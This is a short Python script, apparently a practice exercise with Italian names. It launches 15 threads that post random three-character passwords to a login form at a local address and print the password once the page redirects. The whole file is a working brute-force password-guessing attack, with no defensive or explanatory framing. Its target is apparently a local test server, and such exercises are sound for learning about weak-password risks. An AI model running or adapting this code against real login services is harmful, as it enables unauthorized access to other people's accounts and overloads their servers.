import requests
import random
from threading import Thread

server = "http://0.0.0.0:5000/"
trovato = False


def hackera():
    global trovato
    url = server
    alphabeto = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"

    while server == url and not trovato:
        password = "".join(random.choice(alphabeto) for _ in range(3))
        send = requests.post(url, data={"user": "user", "psw": password})
        url = send.url

        if url != server:
            trovato = True

    print(send.url)
    print(password)


def main():
    th = []

    for i in range(15):
        th.append(Thread(target=hackera))
        th[i].start()

    for thread in th:
        thread.join()


if __name__ == "__main__":
    main()
